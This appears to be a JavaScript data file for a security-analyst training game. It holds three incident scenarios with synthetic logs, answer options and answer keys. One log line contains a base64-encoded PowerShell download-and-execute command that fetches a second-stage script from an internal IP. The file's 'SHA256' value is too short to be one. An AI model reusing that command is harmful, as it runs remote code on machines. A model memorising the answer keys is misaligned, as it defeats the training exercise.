/* tier1Scenarios.js - Tier 1 Analyst Incident Scenarios & Logs */

export const TIER1_SCENARIOS = [
  {
    id: "t1-auth-01",
    title: "Suspicious Authentication Burst on External VPN",
    category: "Authentication",
    severity: "HIGH",
    slaMinutes: 15,
    summary: "SIEM triggered alert T1-AUTH-904: 142 failed SSH/VPN login attempts within 60 seconds targeting user account 'j.doe' from external IP 185.220.101.5.",
    logs: [
      { id: "l1", time: "2026-08-13 20:41:02", source: "VPN-GW01", level: "WARN", event: "Authentication Failed | User: j.doe | SrcIP: 185.220.101.5 | Protocol: IKEv2 | Reason: Invalid Credentials" },
      { id: "l2", time: "2026-08-13 20:41:04", source: "VPN-GW01", level: "WARN", event: "Authentication Failed | User: j.doe | SrcIP: 185.220.101.5 | Protocol: IKEv2 | Reason: Invalid Credentials" },
      { id: "l3", time: "2026-08-13 20:41:15", source: "VPN-GW01", level: "WARN", event: "Authentication Failed | User: j.doe | SrcIP: 185.220.101.5 | Protocol: IKEv2 | Reason: Invalid Credentials (140 similar events suppressed)" },
      { id: "l4", time: "2026-08-13 20:41:48", source: "VPN-GW01", level: "CRIT", event: "Authentication SUCCESS | User: j.doe | SrcIP: 185.220.101.5 | SessionID: VPN-88492 | MFA: BYPASSED_OFFLINE" },
      { id: "l5", time: "2026-08-13 20:42:01", source: "DC-01", level: "INFO", event: "WinEventID 4624 | Successful Logon | TargetUser: j.doe | LogonType: 10 (RemoteInteractive) | IP: 185.220.101.5" }
    ],
    correctAnswers: {
      alertType: "Brute-Force / Password Spraying",
      srcIP: "185.220.101.5",
      targetUser: "j.doe",
      mitreID: "T1110", // Brute Force
      containment: "Revoke Active Session & Reset User Credentials & Block IP on Firewall",
      keyLogId: "l4"
    },
    options: {
      alertTypes: ["False Positive", "Brute-Force / Password Spraying", "DDoS Attack", "SQL Injection"],
      mitreIDs: ["T1110 (Brute Force)", "T1059 (Command Execution)", "T1566 (Phishing)", "T1078 (Valid Accounts)"],
      containmentActions: [
        "Do nothing - benign user forgot password",
        "Revoke Active Session & Reset User Credentials & Block IP on Firewall",
        "Reboot the Domain Controller",
        "Email the user to ask if they logged in"
      ]
    }
  },
  {
    id: "t1-end-02",
    title: "Obfuscated PowerShell Script Invocation on Workstation",
    category: "Endpoint",
    severity: "CRITICAL",
    slaMinutes: 10,
    summary: "EDR agent on PC-SALES-04 flagged process execution 'powershell.exe' with base64 encoded payload and execution policy bypass.",
    logs: [
      { id: "l1", time: "2026-08-13 19:15:20", source: "EDR-AGENT", level: "INFO", event: "Process Create: cmd.exe (PID: 3412) Parent: explorer.exe (PID: 1204) User: CORP\\m.smith" },
      { id: "l2", time: "2026-08-13 19:15:22", source: "EDR-AGENT", level: "CRIT", event: "Process Create: powershell.exe (PID: 5120) CommandLine: 'powershell.exe -nop -w hidden -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTkyLjE2OC4xLjEwMC9zdGFnZTIucHMxJyk='" },
      { id: "l3", time: "2026-08-13 19:15:24", source: "FW-LOG", level: "WARN", event: "Outbound Connection | Src: 10.0.4.52 (PC-SALES-04) -> Dst: 192.168.1.100:8080 | Protocol: HTTP | Bytes: 14200" },
      { id: "l4", time: "2026-08-13 19:15:30", source: "EDR-AGENT", level: "CRIT", event: "File Create: C:\\Users\\Public\\update.exe | SHA256: 9e107d9d372bb6826bd81d3542a419d6" }
    ],
    correctAnswers: {
      alertType: "Malicious Obfuscated Command Execution",
      srcIP: "10.0.4.52",
      targetUser: "m.smith",
      mitreID: "T1059.001", // PowerShell
      containment: "Isolate PC-SALES-04 from network via EDR & Terminate PID 5120",
      keyLogId: "l2"
    },
    options: {
      alertTypes: ["Scheduled Administrative Backup", "Malicious Obfuscated Command Execution", "Printer Driver Update", "Standard System Monitoring"],
      mitreIDs: ["T1059.001 (PowerShell)", "T1003 (OS Credential Dumping)", "T1486 (Data Encrypted for Impact)", "T1071 (Application Layer Protocol)"],
      containmentActions: [
        "Ignore - user was installing Windows Updates",
        "Isolate PC-SALES-04 from network via EDR & Terminate PID 5120",
        "Delete PowerShell.exe from Windows System32",
        "Restart the local firewall service"
      ]
    }
  },
  {
    id: "t1-eml-03",
    title: "Suspicious Executive Spear-Phishing Attachment",
    category: "Email",
    severity: "MEDIUM",
    slaMinutes: 20,
    summary: "Secure Email Gateway flagged inbound email to CFO (cfo@corp.com) containing 'Invoice_Urgent_AUG.xlsm' with enabled VBA macros.",
    logs: [
      { id: "l1", time: "2026-08-13 18:02:11", source: "SEG-GW", level: "INFO", event: "Email Received | From: accounts-payable@paypaI-billing.com | To: cfo@corp.com | Subject: URGENT: Overdue Account Invoice" },
      { id: "l2", time: "2026-08-13 18:02:12", source: "SEG-GW", level: "WARN", event: "Attachment Scan | File: Invoice_Urgent_AUG.xlsm | Type: Macro-enabled Spreadsheet | Status: Delivered to Inbox" },
      { id: "l3", time: "2026-08-13 18:05:44", source: "EDR-AGENT", level: "WARN", event: "Process Create: EXCEL.EXE (PID: 8812) opened document C:\\Users\\cfo\\Downloads\\Invoice_Urgent_AUG.xlsm" },
      { id: "l4", time: "2026-08-13 18:05:48", source: "DNS-LOG", level: "CRIT", event: "DNS Query: malicious-pay-gateway.ru | Resolved: 45.142.12.89 | QueryType: A | Requestor: 10.0.2.14 (PC-CFO-01)" }
    ],
    correctAnswers: {
      alertType: "Phishing / Malicious Macro Attachment",
      srcIP: "45.142.12.89",
      targetUser: "cfo@corp.com",
      mitreID: "T1566.001", // Spearphishing Attachment
      containment: "Purge email from all mailboxes, block malicious-pay-gateway.ru domain, and isolate PC-CFO-01",
      keyLogId: "l4"
    },
    options: {
      alertTypes: ["Legitimate Vendor Invoice", "Phishing / Malicious Macro Attachment", "Internal HR Newsletter", "Spam Advertising"],
      mitreIDs: ["T1566.001 (Spearphishing Attachment)", "T1110 (Brute Force)", "T1055 (Process Injection)", "T1021 (Remote Services)"],
      containmentActions: [
        "Forward email to all employees as warning",
        "Purge email from all mailboxes, block malicious-pay-gateway.ru domain, and isolate PC-CFO-01",
        "Unsubscribe from vendor mailing list",
        "Disable Microsoft Excel globally"
      ]
    }
  }
];
